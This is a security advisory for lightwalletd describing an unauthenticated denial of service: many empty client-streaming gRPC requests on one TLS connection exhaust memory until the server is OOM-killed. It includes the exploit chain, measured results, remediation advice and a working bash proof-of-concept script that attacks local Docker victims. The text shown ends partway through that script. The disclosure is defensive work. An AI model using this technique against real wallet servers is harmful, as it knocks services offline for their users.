# GHSA-5xg7-x58j-m5vr: Unbounded zero-message client streams allow unauthenticated clients to OOM-kill lightwalletd

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-5xg7-x58j-m5vr |
| CVE | none assigned |
| Severity | high |
| CWE | CWE-400, CWE-770 |
| Published | 2026-11-18T00:38:30Z |
| Updated | 2026-11-18T00:38:30Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-5xg7-x58j-m5vr |

## Description (verbatim)

## Severity

**High - CVSS 3.1: 7.5 (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`).**

An unauthenticated network client can make a released or current lightwalletd server retain an unbounded number of live gRPC handlers without sending any protobuf messages or reaching the backend. The complete inline full-binary TLS reproducer below OOM-kills the unmodified `v0.5.4` and current `master` binaries. This matches the security policy rendered for `zcash/lightwalletd`: its High category explicitly includes denial-of-service vulnerabilities affecting light-client server software, including lightwalletd.

The impact is confined to availability of the affected lightwalletd process; no confidentiality, integrity, funds, consensus, or network-wide effect is claimed. Process restart restores service, but an unauthenticated client can reconnect and repeat the same request wave until admission or lifetime limits are deployed.

## Affected asset and exposure

- Repository: `zcash/lightwalletd`
- Component: public gRPC frontend, specifically the client-streaming `GetTaddressBalanceStream` RPC
- Released version reproduced: `v0.5.4`, commit `09593edbee4ee68d47e5a53f8ce1c83514c4e8e6`
- Current version reproduced: `master`, commit `d79cd1100575ff909d70e00d5514a4092df94934`
- Release dependency: `google.golang.org/grpc v1.82.1`
- Current dependency: `google.golang.org/grpc v1.83.1`

The relevant `frontend/service.go`, `cmd/root.go`, generated gRPC handler, and protocol declaration are byte-identical between the two tested lightwalletd commits. This is public production code, not a test-only or disabled RPC. The repository documents a TLS production-server invocation and also documents binding the gRPC service to `0.0.0.0` for network or whole-internet exposure. The command-line default binds to localhost, so remote reachability applies to operators that expose lightwalletd as a wallet backend, as these deployment documents describe.

## Summary

`GetTaddressBalanceStream` is a client-streaming RPC whose generated gRPC handler invokes the application handler as soon as the stream is admitted. The application handler then waits in `addresses.Recv()` with no application deadline if the client sends neither a message nor a half-close. The existing 10,000-address limit never advances because every malicious stream contains zero addresses. lightwalletd's production TLS server supplies no per-connection stream cap, process-wide handler admission bound, or client-stream idle lifetime, while grpc-go's default permits up to `math.MaxUint32` concurrent streams and starts a handler goroutine for each admitted stream. One ordinary TLS connection opened 22,000 such streams, retained 22,014 server goroutines, and OOM-killed fresh 256 MiB release and current victims; larger matched runs killed current `master` at 512 MiB and 1 GiB as well.

## Security boundary violated

A public wallet-service endpoint must bound the aggregate resources an unauthenticated client can reserve, including resources reserved before the first protobuf message arrives. The current per-request defense bounds only addresses successfully received inside one stream. It does not bound the number or idle lifetime of concurrently admitted streams, so host memory becomes the effective aggregate limit.

The relevant boundary is visible in the project's own current source. The comment above `maxTaddrsPerRequest` says the cap protects unauthenticated resource consumption, but the cap is checked only after `Recv()` returns an address. An empty, still-open stream remains before that defense indefinitely.

## Root cause

### 1. The wire protocol exposes a client-streaming request

[`lightwallet-protocol/walletrpc/service.proto:292`](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/lightwallet-protocol/walletrpc/service.proto#L292) declares:

```protobuf
rpc GetTaddressBalanceStream(stream Address) returns (Balance) {}
```

### 2. Admission reaches application code before any message is received

The generated handler at [`walletrpc/service_grpc.pb.go:762-764`](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/walletrpc/service_grpc.pb.go#L762-L764) immediately calls the application handler:

```go
func _CompactTxStreamer_GetTaddressBalanceStream_Handler(srv interface{}, stream grpc.ServerStream) error {
	return srv.(CompactTxStreamerServer).GetTaddressBalanceStream(
		&grpc.GenericServerStream[Address, Balance]{ServerStream: stream})
}
```

No `Recv()` occurs at this layer.

### 3. The application waits indefinitely before reaching its per-request cap

[`frontend/service.go:642-682`](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/frontend/service.go#L642-L682) creates an empty slice and blocks on `addresses.Recv()`:

```go
addressList := make([]string, 0)
for {
	addr, err := addresses.Recv()
	if err == io.EOF {
		break
	}
	if err != nil {
		return status.Errorf(codes.Internal, "GetTaddressBalanceStream Recv error: %s", err.Error())
	}
	if err := checkTaddress(addr.Address); err != nil {
		return err
	}
	if len(addressList) >= maxTaddrsPerRequest {
		return status.Errorf(codes.ResourceExhausted,
			"GetTaddressBalanceStream: too many addresses (limit %d)", maxTaddrsPerRequest)
	}
	addressList = append(addressList, addr.Address)
}
balance, err := getTaddressBalanceZcashdRpc(addresses.Context(), addressList)
```

For a client that sends no message and does not half-close, `Recv()` has no successful return, the address count remains zero, the backend call is never reached, and the handler lives until cancellation, transport closure, or process termination.

### 4. Production server construction supplies no aggregate admission or idle-lifetime bound

The TLS branch at [`cmd/root.go:154-182`](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/cmd/root.go#L154-L182) constructs `grpc.NewServer` with credentials, metrics, and logging interceptors. It does not set `grpc.MaxConcurrentStreams`, install an application admission limiter, or impose a deadline on this client stream. The plaintext branch has the same absence.

grpc-go `v1.82.1` defaults `maxConcurrentStreams` to `math.MaxUint32` in [`server.go:188-197`](https://github.com/grpc/grpc-go/blob/v1.82.1/server.go#L188-L197). Its serving path acquires that quota and starts one handler goroutine per admitted stream in [`server.go:1071-1090`](https://github.com/grpc/grpc-go/blob/v1.82.1/server.go#L1071-L1090). Current grpc-go `v1.83.1` has the same defaults and serving logic.

The default connection-idle option is not a rescue: grpc-go defines connection idleness from the point where the number of outstanding RPCs becomes zero. These malicious streams are outstanding RPCs, and the default `MaxConnectionIdle` is infinity ([`keepalive/keepalive.go:62-85`](https://github.com/grpc/grpc-go/blob/v1.82.1/keepalive/keepalive.go#L62-L85)).

## Triggering preconditions

This is a directly attacker-triggerable condition:

1. A lightwalletd operator exposes the gRPC listener to wallet clients.
2. The attacker can complete an ordinary TLS connection to that listener; no client certificate or application credential is required.
3. The attacker opens many `GetTaddressBalanceStream` RPCs but sends neither an `Address` message nor client EOF.

No malformed protobuf, oversized message, backend influence, chain state, race, or privileged role is required. The demonstrated construction uses one TCP/TLS/gRPC client connection.

## Exploit chain

1. The attacker establishes one TLS gRPC connection to lightwalletd.
2. For each new HTTP/2 stream, the attacker sends the ordinary gRPC request headers for `GetTaddressBalanceStream` and then leaves the request body open.
3. grpc-go admits the stream and starts a new server handler goroutine.
4. The generated method dispatches into `GetTaddressBalanceStream` before receiving a message.
5. That handler waits at `addresses.Recv()`. The per-request address count is still zero and the backend is untouched.
6. The attacker repeats steps 2-5 on the same connection. Each live stream retains handler and transport state with no aggregate application bound.
7. At the container memory limit, the operating system OOM-kills the production lightwalletd process. Ordinary wallet RPC service on that instance stops.
8. Restart clears the process-local state, but repeating the same unauthenticated stream wave terminates the replacement unless an external or application-level bound is added.

## Proof of concept

### Safety and prerequisites

Run only against the local Docker victim created by the script. The reproducer does not contact or test public Zcash infrastructure.

Prerequisites:

- Docker with Linux-container support
- `git`, `rg`, and `jq`
- Network access to fetch the exact public Git commits and the pinned Go build image
- Enough local memory for the bounded Docker cases

The default positive case deliberately OOM-kills only a fresh **256 MiB Docker container**. All containers and the network use the label `security.reproduction=lightwalletd-idle-stream`, and an exit trap removes the named resources.

### Files

The complete inline PoC below contains:

- `poc/reproduce.sh`: fail-closed end-to-end orchestrator
- `poc/harness/main.go`: TLS gRPC client and lifecycle control
- `poc/harness/backend.go`: minimal backend needed for ordinary lightwalletd startup validation
- `poc/harness/go.mod` and `poc/harness/go.sum`: pinned harness dependencies

The script initializes a fresh temporary Git repository, fetches the exact target commit, asserts that checkout is clean, builds the unmodified complete lightwalletd binary, and builds the client harness. It uses this pinned build image:

```text
golang@sha256:699337d620559a59b4a2bb298ad59611e535d2ee755a34cf2d2a98f37578dc80
```

### Released `v0.5.4`

After saving the inline files under the documented `poc/` tree, run from its parent directory:

```bash
bash poc/reproduce.sh
```

The exact final validation ended with:

```text
IDLE_STREAM_OBSERVER connections=1 started_handlers=22000 goroutines=22014 memory_current=288002048 memory_peak=289529856 backend_unchanged=true
IDLE_STREAM_POSITIVE connections=1 opened=22000 running=false oom=true exit=137 backend_unchanged=true
IDLE_STREAM_RESTART recovered=true
IDLE_STREAM_CONTROL connections=1 opened=100000 canceled=100000 running=true oom=false memory_peak=54964224 events=low 0,high 0,max 0,oom 0,oom_kill 0,oom_group_kill 0,
IDLE_STREAM_RESULT target=v0.5.4 commit=09593edbee4ee68d47e5a53f8ce1c83514c4e8e6 single_connection=true zero_messages=true handlers=22000 oom_256m=true cancel_control_100000_alive=true restart_recovers=true backend_balance_calls=0
```

### Current `master`

```bash
TARGET_COMMIT=d79cd1100575ff909d70e00d5514a4092df94934 \
TARGET_LABEL=current-d79cd11 \
bash poc/reproduce.sh
```

The exact final validation ended with:

```text
IDLE_STREAM_OBSERVER connections=1 started_handlers=22000 goroutines=22014 memory_current=296247296 memory_peak=297148416 backend_unchanged=true
IDLE_STREAM_POSITIVE connections=1 opened=22000 running=false oom=true exit=137 backend_unchanged=true
IDLE_STREAM_RESTART recovered=true
IDLE_STREAM_CONTROL connections=1 opened=100000 canceled=100000 running=true oom=false memory_peak=51298304 events=low 0,high 0,max 0,oom 0,oom_kill 0,oom_group_kill 0,
IDLE_STREAM_RESULT target=current-d79cd11 commit=d79cd1100575ff909d70e00d5514a4092df94934 single_connection=true zero_messages=true handlers=22000 oom_256m=true cancel_control_100000_alive=true restart_recovers=true backend_balance_calls=0
```

The script exits nonzero unless it observes all of the following:

- exactly one server-side gRPC connection before and after all 22,000 observer streams;
- 22,000 started `GetTaddressBalanceStream` handlers and at least 22,000 live goroutines;
- no backend-counter change during the observer or positive attack;
- victim process termination, `OOMKilled=true`, and exit code 137 in the positive case;
- successful `GetLatestBlock` after restarting the killed victim; and
- 100,000 opened-and-immediately-canceled streams without OOM, followed by a successful ordinary RPC.

### Additional production-memory scaling

Using the same final current-master binary and harness, matched terminal runs also produced:

```text
FINAL_SCALE limit=512m streams=45000 running=false oom=true exit=137
FINAL_SCALE limit=1g streams=90000 running=false oom=true exit=137
```

These are not lowered application limits; they are container memory budgets used to observe the terminal operating-system behavior without endangering the host. The vulnerable application and grpc-go stream limit remain unchanged. A larger production memory budget raises the number of streams required but does not introduce an application bound.

A separate current-master observer recorded about 373 kB transmitted by the client container while 22,000 live streams retained 277.4 MiB in the victim. Docker reports aggregate human-readable network counters, so that figure is supporting operational evidence rather than exact protocol-byte accounting.

## Controls, recovery, and what the PoC proves

The positive case proves process-level availability loss through the real TCP, TLS, HTTP/2, gRPC dispatch, application handler, and operating-system OOM path of an unmodified full lightwalletd binary.

The lifecycle controls support retained stream lifetime as the cause:

- **Zero-message/backend control:** all held streams contain no protobuf message, and backend counters remain unchanged. Backend work is not the amplification source.
- **Cancellation control:** a fresh 256 MiB victim survives 100,000 sequential open-and-immediate-cancel operations on one TLS connection, reports no OOM event, and answers `GetLatestBlock` afterward. Ordinary cancellation therefore releases the resources; the positive case retains them by keeping RPCs legitimately outstanding.
- **Restart control:** the OOM-killed container is restarted and answers `GetLatestBlock`. Retention is process-local, not durable state corruption.
- **Revision control:** the same fail-closed script passes against the exact released tag commit and the stated current commit.
- **Unchanged-code control:** the target checkout is clean and the reproducer builds the complete binary without applying a target patch or failpoint.

This report claims a repeatable denial of service of one exposed lightwalletd instance. It does not claim persistence across process death or a network-wide Zcash outage.

## Why the witness generalizes

The 256 MiB, 512 MiB, and 1 GiB containers are bounded witnesses for a missing aggregate bound, not the source of that missing bound. Every admitted empty stream creates an outstanding RPC and a live handler; the address cap stays at zero, grpc-go's configured limit stays `math.MaxUint32`, and no application timer ends the wait. The measured terminal stream count scales upward with the victim's available memory (22,000 at 256 MiB, 45,000 at 512 MiB, and 90,000 at 1 GiB on current `master`). Therefore a host with more memory requires more streams, but the terminating condition remains host resource exhaustion rather than an intended lightwalletd ceiling.

The single-connection result also eliminates connection-fanout as a necessary precondition. A reverse proxy or service mesh may add deployment-specific protections, but lightwalletd's supported direct TLS server contains no equivalent admission/lifetime defense.

## Operational realism and test-boundary clarification

The project documents a production TLS invocation in [`README.md:111-126`](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/README.md#L111-L126). Its Docker run examples bind the gRPC service to `0.0.0.0` ([`docs/docker-run.md:6-18`](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/docs/docker-run.md#L6-L18)), and the Docker Compose guide explicitly documents whole-internet exposure ([`docs/docker-compose-setup.md:126-138`](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/docs/docker-compose-setup.md#L126-L138)). No public endpoint was scanned or stressed.

The PoC uses the repository's test certificate and disables certificate verification only in the isolated client because that certificate is self-signed. It still exercises lightwalletd's exact production TLS constructor. A remote client does not need to trust the server certificate to consume server resources; a publicly trusted production certificate only removes the harness-specific client option.

The backend is synthetic so the full binary can complete its normal startup check in an isolated environment. It identifies itself as Zebra, and the script intentionally does **not** pass `--no-backend-check`. The attack never depends on backend content or delay: before and after counters prove that held zero-message streams do not issue `getaddressbalance` or any other backend request. The script uses the supported `--nocache` option only to avoid an unrelated block-ingestor fixture; it does not change gRPC admission, handler dispatch, or the affected method.

## Relationship to prior public work

This issue is in the same public resource-exhaustion family as [`GHSA-x4m7-3gpp-xc36`](https://github.com/zcash/lightwalletd/security/advisories/GHSA-x4m7-3gpp-xc36), and the distinction should be evaluated narrowly.

That advisory covered attacker-controlled address accumulation **inside one** `GetTaddressBalanceStream` and backend result materialization. Its released repair validates each received address and limits one request to 10,000 addresses. The advisory also recommended server-level stream duration and concurrency controls, which is close prior art for the defense needed here.

The current construction reaches a different first failing edge after that repair:

- it sends zero `Address` messages across many admitted streams;
- the current `maxTaddrsPerRequest` counter remains zero on every stream;
- none of the previously vulnerable address accumulation or backend materialization occurs;
- the public patched versions (`v0.5.0` through tested `v0.5.4`) remain affected; and
- the minimal repair must bound aggregate stream admission and/or pre-first-message idle lifetime, rather than only the number or validity of addresses inside a stream.

This report therefore does not assert that server-level concurrency risk was absent from prior analysis. It reports a concrete post-fix bypass, terminal full-binary evidence on released and current code, and the exact zero-message lifecycle that the existing per-request repair cannot reach.

The other close public lifecycle work is [`issue #559`](https://github.com/zcash/lightwalletd/issues/559) and [`PR #560`](https://github.com/zcash/lightwalletd/pull/560), which addressed a `GetBlockRange` producer goroutine stranded **after a server-streaming client disconnect**. [`PR #564`](https://github.com/zcash/lightwalletd/pull/564) made backend requests context-aware. This report does not rely on failed cancellation or a backend call: the 100,000-cancellation control succeeds, while the vulnerable state exists before any message or backend work.

## Recommended remediation

Apply defense in depth at the resource-reservation boundary:

1. Add a **process-wide** admission bound for concurrently executing public RPC handlers, with a smaller method-specific bound for `GetTaddressBalanceStream`. Excess work should fail with `ResourceExhausted` before a handler goroutine waits in application code.
2. Add a bounded client-stream idle lifetime, including time to first message and time between messages. Return `DeadlineExceeded` or cancel the handler when the client stops making progress.
3. Configure `grpc.MaxConcurrentStreams` to a safe per-connection value. This limits the demonstrated one-connection construction, but is not sufficient alone because an unauthenticated actor can open multiple connections.
4. Add deployment-level connection and source-rate limits appropriate to publicly exposed wallet infrastructure.
5. Add full-server regression tests that hold many zero-message client streams and assert a fixed handler ceiling, expiration after the idle deadline, continued availability of an ordinary RPC, and correct reclamation after cancellation.

The key invariant is that resources reserved before the first protobuf message must have both a cardinality bound and a finite lifetime.

## Independence from neighboring issues

The reported root cause is aggregate admission and lifetime of zero-message client streams in the public gRPC frontend. The affected object is a live handler/transport stream, and the demonstrated impact is termination of the lightwalletd process. It does not depend on repeated protobuf fields, accumulated address data, transaction parsing, backend fan-out, malformed chain data, or a producer failing to observe cancellation.

## References

- [`zcash/lightwalletd` security policy and private-disclosure route](https://github.com/zcash/lightwalletd/security/policy)
- [Pinned organization security policy source](https://github.com/zcash/.github/blob/32940a29b29cc02c6c182927121ec2f5c4561fb2/SECURITY.md#L26-L34)
- [`GetTaddressBalanceStream` protocol declaration](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/lightwallet-protocol/walletrpc/service.proto#L291-L292)
- [Generated stream handler](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/walletrpc/service_grpc.pb.go#L762-L767)
- [Application receive loop and per-request cap](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/frontend/service.go#L642-L682)
- [Production TLS server construction](https://github.com/zcash/lightwalletd/blob/09593edbee4ee68d47e5a53f8ce1c83514c4e8e6/cmd/root.go#L138-L184)
- [grpc-go `v1.82.1` default server options](https://github.com/grpc/grpc-go/blob/v1.82.1/server.go#L188-L197)
- [grpc-go `v1.82.1` stream handler creation](https://github.com/grpc/grpc-go/blob/v1.82.1/server.go#L1071-L1090)
- [grpc-go server keepalive defaults](https://github.com/grpc/grpc-go/blob/v1.82.1/keepalive/keepalive.go#L62-L85)
- [`GHSA-x4m7-3gpp-xc36`](https://github.com/zcash/lightwalletd/security/advisories/GHSA-x4m7-3gpp-xc36)
- [`zcash/lightwalletd` issue #559](https://github.com/zcash/lightwalletd/issues/559), [PR #560](https://github.com/zcash/lightwalletd/pull/560), and [PR #564](https://github.com/zcash/lightwalletd/pull/564)

## Inline PoC source

Create the following files at the exact paths shown. Their contents are byte-identical to the files in the frozen recipient archive. Then run the reproduction commands above.

Frozen archive SHA-256: `d19462bc44048510f4f5fe81943e0df87a15ec318e7036908be9d3a2e09e206a`.

### `poc/reproduce.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

readonly IMAGE='golang@sha256:699337d620559a59b4a2bb298ad59611e535d2ee755a34cf2d2a98f37578dc80'
readonly DEFAULT_COMMIT='09593edbee4ee68d47e5a53f8ce1c83514c4e8e6'
readonly TARGET_COMMIT="${TARGET_COMMIT:-$DEFAULT_COMMIT}"
readonly TARGET_LABEL="${TARGET_LABEL:-v0.5.4}"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly RUN_ID="lwd-idle-stream-repro-$$"
readonly NETWORK="${RUN_ID}-net"
readonly BACKEND="${RUN_ID}-backend"
readonly OBSERVER="${RUN_ID}-observer"
readonly OBSERVER_CLIENT="${RUN_ID}-observer-client"
readonly VICTIM="${RUN_ID}-victim"
readonly ATTACKER="${RUN_ID}-attacker"
readonly CONTROL="${RUN_ID}-control"
readonly CONTROL_CLIENT="${RUN_ID}-control-client"
readonly WORK_DIR="$(mktemp -d "${TMPDIR:-/tmp}/lightwalletd-idle-stream.XXXXXX")"
readonly SOURCE_DIR="${WORK_DIR}/lightwalletd"
readonly OUTPUT_DIR="${WORK_DIR}/out"

fail() {
	printf 'IDLE_STREAM_ASSERTION_FAILED %s\n' "$1" >&2
	exit 1
}

cleanup() {
	docker rm -f "$OBSERVER_CLIENT" "$OBSERVER" "$ATTACKER" "$VICTIM" \
		"$CONTROL_CLIENT" "$CONTROL" "$BACKEND" >/dev/null 2>&1 || true
	docker network rm "$NETWORK" >/dev/null 2>&1 || true
	if command -v trash >/dev/null 2>&1; then
		trash "$WORK_DIR"
	else
		printf 'IDLE_STREAM_CLEANUP_NOTE temporary directory preserved at %s\n' "$WORK_DIR"
	fi
}
trap cleanup EXIT INT TERM

for command_name in docker git rg jq; do
	command -v "$command_name" >/dev/null 2>&1 || fail "missing required command: ${command_name}"
done

mkdir -p "$SOURCE_DIR" "$OUTPUT_DIR"
git -C "$SOURCE_DIR" init --quiet
git -C "$SOURCE_DIR" remote add origin https://github.com/zcash/lightwalletd.git
git -C "$SOURCE_DIR" fetch --quiet --depth 1 origin "$TARGET_COMMIT"
git -C "$SOURCE_DIR" -c advice.detachedHead=false checkout --quiet FETCH_HEAD
actual_commit="$(git -C "$SOURCE_DIR" rev-parse HEAD)"
[[ "$actual_commit" == "$TARGET_COMMIT" ]] || fail "unexpected source commit: got ${actual_commit} want ${TARGET_COMMIT}"
[[ -z "$(git -C "$SOURCE_DIR" status --short)" ]] || fail 'source checkout is not clean'
printf 'IDLE_STREAM_SOURCE label=%s commit=%s clean=true\n' "$TARGET_LABEL" "$actual_commit"

docker run --rm \
	--label security.reproduction=lightwalletd-idle-stream \
	-e CGO_ENABLED=0 \
	-v "$SOURCE_DIR:/src:ro" \
	-v "$OUTPUT_DIR:/out" \
	-w /src \
	"$IMAGE" \
	go build -trimpath \
	-ldflags "-X github.com/zcash/lightwalletd/common.Version=${TARGET_LABEL} -X github.com/zcash/lightwalletd/common.GitCommit=${TARGET_COMMIT} -X github.com/zcash/lightwalletd/common.BuildUser=reproduction -X github.com/zcash/lightwalletd/common.BuildDate=2026-09-08" \
	-o /out/lightwalletd .

docker run --rm \
	--label security.reproduction=lightwalletd-idle-stream \
	-e CGO_ENABLED=0 \
	-v "$SCRIPT_DIR/harness:/src:ro" \
	-v "$OUTPUT_DIR:/out" \
	-w /src \
	"$IMAGE" \
	go build -trimpath -o /out/idle-stream-harness .

docker network create --label security.reproduction=lightwalletd-idle-stream "$NETWORK" >/dev/null
docker run -d --name "$BACKEND" \
	--label security.reproduction=lightwalletd-idle-stream \
	--network "$NETWORK" \
	-v "$OUTPUT_DIR:/out:ro" \
	"$IMAGE" \
	/out/idle-stream-harness backend -listen 0.0.0.0:19244 >/dev/null
for _ in {1..100}; do
	docker logs "$BACKEND" 2>&1 | rg -q '^IDLE_STREAM_BACKEND_READY' && break
	sleep 0.1
done
docker logs "$BACKEND" 2>&1 | rg -q '^IDLE_STREAM_BACKEND_READY' || fail 'backend did not become ready'

start_victim() {
	local name="$1"
	local memory="$2"
	docker run -d --name "$name" \
		--label security.reproduction=lightwalletd-idle-stream \
		--network "$NETWORK" \
		--memory="$memory" --memory-swap="$memory" \
		-v "$OUTPUT_DIR:/out:ro" \
		-v "$SOURCE_DIR/docker:/cert:ro" \
		"$IMAGE" \
		/out/lightwalletd \
		--grpc-bind-addr=0.0.0.0:19245 \
		--http-bind-addr=0.0.0.0:19246 \
		--tls-cert=/cert/cert.pem --tls-key=/cert/cert.key \
		--rpchost="$BACKEND" --rpcport=19244 \
		--rpcuser=reproduction --rpcpassword=reproduction \
		--nocache=true \
		--data-dir=/tmp/lightwalletd --log-file=/tmp/lightwalletd.log >/dev/null
	for _ in {1..100}; do
		docker exec "$name" curl -fsS http://127.0.0.1:19246/metrics >/dev/null 2>&1 && break
		sleep 0.1
	done
	docker exec "$name" curl -fsS http://127.0.0.1:19246/metrics >/dev/null 2>&1 || fail "${name} did not become ready"
}

backend_status() {
	docker exec "$BACKEND" curl -fsS http://127.0.0.1:19244/status
}

# Observer: establish the exact one-connection -> 22,000 live-handler bridge
# at a memory limit high enough to inspect it before cleanup.
start_victim "$OBSERVER" 512m
observer_backend_before="$(backend_status)"
docker run -d --name "$OBSERVER_CLIENT" \
	--label security.reproduction=lightwalletd-idle-stream \
	--network "$NETWORK" \
	-v "$OUTPUT_DIR:/out:ro" \
	"$IMAGE" \
	/out/idle-stream-harness -target "${OBSERVER}:19245" -tls \
	-count 22000 -mode hold -pause-before-open 5s -pause 30s >/dev/null
for _ in {1..100}; do
	docker logs "$OBSERVER_CLIENT" 2>&1 | rg -q '^IDLE_STREAM_CONNECTIONS_READY' && break
	sleep 0.1
done
observer_connections_before="$(docker exec "$OBSERVER" curl -fsS http://127.0.0.1:19246/metrics | awk '$1 == "grpc_server_connections_current" {print $2}')"
[[ "$observer_connections_before" == '1' ]] || fail "observer expected one connection before stream creation, got ${observer_connections_before}"
for _ in {1..150}; do
	docker logs "$OBSERVER_CLIENT" 2>&1 | rg -q '^IDLE_STREAM_DONE mode=hold opened=22000 held=22000' && break
	sleep 0.1
done
docker logs "$OBSERVER_CLIENT" 2>&1 | rg -q '^IDLE_STREAM_DONE mode=hold opened=22000 held=22000' || fail 'observer client did not hold all 22,000 streams'
observer_metrics="$(docker exec "$OBSERVER" curl -fsS http://127.0.0.1:19246/metrics)"
observer_connections_after="$(printf '%s\n' "$observer_metrics" | awk '$1 == "grpc_server_connections_current" {print $2}')"
observer_started="$(printf '%s\n' "$observer_metrics" | awk '/grpc_server_started_total.*GetTaddressBalanceStream/ {print $2}')"
observer_goroutines="$(printf '%s\n' "$observer_metrics" | awk '$1 == "go_goroutines" {print $2}')"
observer_memory="$(docker exec "$OBSERVER" cat /sys/fs/cgroup/memory.current)"
observer_peak="$(docker exec "$OBSERVER" cat /sys/fs/cgroup/memory.peak)"
observer_backend_after="$(backend_status)"
[[ "$observer_connections_after" == '1' ]] || fail "observer expected one connection after stream creation, got ${observer_connections_after}"
[[ "$observer_started" == '22000' ]] || fail "observer expected 22,000 started handlers, got ${observer_started}"
(( observer_goroutines >= 22000 )) || fail "observer expected at least 22,000 live goroutines, got ${observer_goroutines}"
[[ "$(docker inspect -f '{{.State.Running}}' "$OBSERVER")" == 'true' ]] || fail 'observer victim exited unexpectedly'
[[ "$observer_backend_before" == "$observer_backend_after" ]] || fail 'observer stream creation reached the backend'
printf 'IDLE_STREAM_OBSERVER connections=%s started_handlers=%s goroutines=%s memory_current=%s memory_peak=%s backend_unchanged=true\n' \
	"$observer_connections_after" "$observer_started" "$observer_goroutines" "$observer_memory" "$observer_peak"
docker rm -f "$OBSERVER_CLIENT" "$OBSERVER" >/dev/null

# Positive: the same 22,000 zero-message streams terminate a fresh 256 MiB
# production server process.
start_victim "$VICTIM" 256m
positive_backend_before="$(backend_status)"
docker run -d --name "$ATTACKER" \
	--label security.reproduction=lightwalletd-idle-stream \
	--network "$NETWORK" \
	-v "$OUTPUT_DIR:/out:ro" \
	"$IMAGE" \
	/out/idle-stream-harness -target "${VICTIM}:19245" -tls \
	-count 22000 -mode hold -pause-before-open 5s -pause 5s >/dev/null
for _ in {1..100}; do
	docker logs "$ATTACKER" 2>&1 | rg -q '^IDLE_STREAM_CONNECTIONS_READY' && break
	sleep 0.1
done
positive_connections="$(docker exec "$VICTIM" curl -fsS http://127.0.0.1:19246/metrics | awk '$1 == "grpc_server_connections_current" {print $2}')"
[[ "$positive_connections" == '1' ]] || fail "positive expected one connection before stream creation, got ${positive_connections}"
for _ in {1..150}; do
	[[ "$(docker inspect -f '{{.State.Running}}' "$VICTIM")" == 'false' ]] && break
	sleep 0.1
done
positive_output="$(docker logs "$ATTACKER" 2>&1)"
printf '%s\n' "$positive_output"
positive_backend_after="$(backend_status)"
[[ "$positive_output" == *'IDLE_STREAM_DONE mode=hold opened=22000 held=22000'* ]] || fail 'positive client did not open and retain all 22,000 streams'
[[ "$(docker inspect -f '{{.State.Running}}' "$VICTIM")" == 'false' ]] || fail 'positive victim remained running'
[[ "$(docker inspect -f '{{.State.OOMKilled}}' "$VICTIM")" == 'true' ]] || fail 'positive victim was not OOM-killed'
[[ "$(docker inspect -f '{{.State.ExitCode}}' "$VICTIM")" == '137' ]] || fail 'positive victim did not exit 137'
[[ "$positive_backend_before" == "$positive_backend_after" ]] || fail 'positive stream creation reached the backend'
printf 'IDLE_STREAM_POSITIVE connections=1 opened=22000 running=false oom=true exit=137 backend_unchanged=true\n'

# Restart recovers because the retained state is process-local.
docker rm -f "$ATTACKER" >/dev/null
docker start "$VICTIM" >/dev/null
for _ in {1..100}; do
	docker exec "$VICTIM" curl -fsS http://127.0.0.1:19246/metrics >/dev/null 2>&1 && break
	sleep 0.1
done
restart_output="$(docker run --rm --name "$ATTACKER" \
	--label security.reproduction=lightwalletd-idle-stream \
	--network "$NETWORK" \
	-v "$OUTPUT_DIR:/out:ro" \
	"$IMAGE" \
	/out/idle-stream-harness -target "${VICTIM}:19245" -tls -count 1 -mode cancel -pause 1s)"
printf '%s\n' "$restart_output"
[[ "$restart_output" == *'IDLE_STREAM_POST_CONTROL_PROBE success=true error=<nil>'* ]] || fail 'restart probe failed'
[[ "$(docker inspect -f '{{.State.Running}}' "$VICTIM")" == 'true' ]] || fail 'restarted victim is unavailable'
printf 'IDLE_STREAM_RESTART recovered=true\n'
docker rm -f "$VICTIM" >/dev/null

# Matched lifecycle control: open and immediately cancel 100,000 streams over
# one TLS connection. The process remains alive and answers an ordinary RPC.
start_victim "$CONTROL" 256m
control_output="$(docker run --name "$CONTROL_CLIENT" \
	--label security.reproduction=lightwalletd-idle-stream \
	--network "$NETWORK" \
	-v "$OUTPUT_DIR:/out:ro" \
	"$IMAGE" \
	/out/idle-stream-harness -target "${CONTROL}:19245" -tls \
	-count 100000 -mode cancel -pause 1s)"
printf '%s\n' "$control_output"
control_peak="$(docker exec "$CONTROL" cat /sys/fs/cgroup/memory.peak)"
control_events="$(docker exec "$CONTROL" sh -c 'tr "\n" "," < /sys/fs/cgroup/memory.events')"
[[ "$control_output" == *'IDLE_STREAM_DONE mode=cancel opened=100000 held=0'* ]] || fail 'control did not cancel all 100,000 streams'
[[ "$control_output" == *'IDLE_STREAM_POST_CONTROL_PROBE success=true error=<nil>'* ]] || fail 'post-control availability probe failed'
[[ "$(docker inspect -f '{{.State.Running}}' "$CONTROL")" == 'true' ]] || fail 'control victim exited'
[[ "$(docker inspect -f '{{.State.OOMKilled}}' "$CONTROL")" == 'false' ]] || fail 'control victim was OOM-killed'
[[ "$(backend_status | jq -r '.getaddressbalance // 0')" == '0' ]] || fail 'a zero-message stream reached getaddressbalance'
printf 'IDLE_STREAM_CONTROL connections=1 opened=100000 canceled=100000 running=true oom=false memory_peak=%s events=%s\n' \
	"$control_peak" "$control_events"

